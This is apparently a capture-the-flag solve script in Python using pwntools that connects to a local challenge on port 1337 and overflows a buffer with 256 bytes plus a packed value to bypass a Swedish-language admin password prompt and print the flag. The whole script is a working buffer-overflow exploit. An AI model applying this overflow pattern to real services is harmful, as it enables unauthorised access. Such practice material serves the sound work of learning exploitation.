#!/usr/bin/env python3

from pwn import *

HOST = 'localhost'
PORT = 1337

io = remote(HOST, PORT)
io.recvline_contains('Skriv in admin lösenordet:'.encode())

payload = b'A'*256
payload += p64(1)

io.sendline(payload)

io.recvline_contains('Uhh, jag vet inte hur du kom in hit men här har du flaggan'.encode())
flag = io.recvline().decode().strip()
log.info('Flag: %s', flag)
